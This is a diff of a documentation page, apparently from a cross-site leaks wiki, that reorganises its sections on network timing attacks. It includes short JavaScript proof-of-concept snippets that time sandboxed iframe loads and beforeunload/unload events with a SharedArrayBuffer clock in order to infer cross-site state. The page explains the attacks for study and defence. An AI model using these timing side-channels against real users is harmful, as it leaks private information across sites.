@@ -32,6 +32,7 @@ This side-channel allows attackers to infer information from a cross-site reques
 {{< hint tip >}}
 Learn more about the different types of clocks in the [Clocks Article]({{< ref "clocks.md" >}}).
 {{< /hint >}}
+
 ## Modern Web Timing Attacks
 
 The [performance.now()]({{< ref "clocks.md#performancenow" >}}) API can be used to measure how much time it takes to perform a request.
@@ -73,28 +74,6 @@ script.onload = () => {
 A similar technique can be used for other HTML elements, e.g. `<img>`, `<link>`, `<iframe>` which could be used in scenarios where other techniques fail. For example, if [Fetch Metadata]({{< ref "/docs/defenses/opt-in/fetch-metadata.md">}}) blocked loading of a resource into a script tag it may allow it into an image tag.
 {{< /hint >}}
 
-## Sandboxed Frame Timing Attacks
-
-If a page doesn't have any [Framing Protections]({{< ref "../../defenses/opt-in/xfo.md" >}}) implemented, an attacker can time how long it takes for the page and all subresources to load over the network. By default, the `onload` handler for an iframe will be invoked after all the resources have been loaded and all Javascript has finished executing. But, an attacker can eliminate the noise of script execution by including the [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) attribute in the `<iframe>`. This attribute will block a lot of features including Javascript execution, which results in almost pure network measurement.
-
-```javascript
-var iframe = document.createElement('iframe');
-// Set the URL of the destination website
-iframe.src = "https://example.org";
-// Set sandbox attribute to block script execution
-iframe.sandbox = "";
-document.body.appendChild(iframe);
-
-// Measure the time before the request was initiated
-var start = performance.now();
-
-iframe.onload = () => {
-  // When iframe loads, calculate the time difference
-  var time = performance.now() - start;
-  console.log("The iframe and subresources took %d ms to load.", time)
-}
-```
-
 ## Cross-window Timing Attacks
 
 An attacker can also measure the network timing of a page by opening a new window with `window.open` and waiting for the `window` to start loading. The snippet below shows how to make this measurement.
@@ -129,20 +108,57 @@ Note that this POC uses `setTimeout` in order to create the rough equivalent of 
 This technique can also be adapted to measure the Execution Timing of a page by [making the event loop busy]({{< ref "execution-timing.md#busy-event-loop" >}}).
 {{< /hint >}}
 
-## Network timing using the unload events with a SharedArrayBuffer
-The [SharedArrayBuffer](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/SharedArrayBuffer) can be used to create a high-resolution timer [link]({{< ref "clocks.md#sharedarraybuffer-and-web-workers">}})
-However the timing diffrence between the beforeunload and unload event of iframes can still be used.
+## Unload events
+
+<!-- TODO add explainer what the difference between onbeforeunload and onunload measures, how, and why -->
+
+The below snippet makes use of [SharedArrayBuffer clock]({{< ref "clocks.md#sharedarraybuffer-and-web-workers" >}}) which needs to be initiated before the snippet is ran.
 ```javascript
-iframe.contentWindow.onbeforeunload = _ => {
-  // Get time during navigation
+// Create a Shared buffer to be used by a WebWorker
+var sharedBuffer = new SharedArrayBuffer(Uint32Array.BYTES_PER_ELEMENT);
+var sharedArray = new Uint32Array(sharedBuffer);
+
+// Follow the steps of initiating the WebWorker and then call
+worker.postMessage(sharedBuffer);
+
+var start;
+iframe.contentWindow.onbeforeunload = () => {
+  // Get the "time" during the navigation
   start = Atomics.load(sharedArray, 0);
 }
-iframe.contentWindow.onunload = _ => {
-  // Get time after navigation
-  let time = Atomics.load(sharedArray, 0);
-  console.log(time - start);
+iframe.contentWindow.onunload = () => {
+  // Get the "time" after the navigation
+  var end = Atomics.load(sharedArray, 0);
+  console.log('The difference between events was %d iterations', end - start);
 };
 ```
+
+{{< hint tip >}}
+The [SharedArrayBuffer clock]({{< ref "clocks.md#sharedarraybuffer-and-web-workers" >}}) was used to create a high-resolution timer, however, the timing diffrence between the beforeunload and unload event of iframes can be measured with other clocks as well, e.g. *performance.now()*.
+{{< /hint >}}
+
+## Sandboxed Frame Timing Attacks
+
+If a page doesn't have any [Framing Protections]({{< ref "../../defenses/opt-in/xfo.md" >}}) implemented, an attacker can time how long it takes for the page and all subresources to load over the network. By default, the `onload` handler for an iframe will be invoked after all the resources have been loaded and all Javascript has finished executing. But, an attacker can eliminate the noise of script execution by including the [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) attribute in the `<iframe>`. This attribute will block a lot of features including Javascript execution, which results in almost pure network measurement.
+
+```javascript
+var iframe = document.createElement('iframe');
+// Set the URL of the destination website
+iframe.src = "https://example.org";
+// Set sandbox attribute to block script execution
+iframe.sandbox = "";
+document.body.appendChild(iframe);
+
+// Measure the time before the request was initiated
+var start = performance.now();
+
+iframe.onload = () => {
+  // When iframe loads, calculate the time difference
+  var time = performance.now() - start;
+  console.log("The iframe and subresources took %d ms to load.", time)
+}
+```
+
 ## Timeless Timing Attacks
 
 Other attacks do not consider the notion of time to perform a timing attack [^3]. Timeless attacks consist of fitting two `HTTP` requests in a single packet, the baseline and the attacked request, to guarantee they arrive at the same time to the server. The server *will* process the requests concurrently, and return a response based on their execution time as soon as possible. One of the two requests will arrive first, allowing the attacker to get the timing difference by comparing the order in which the requests arrived.
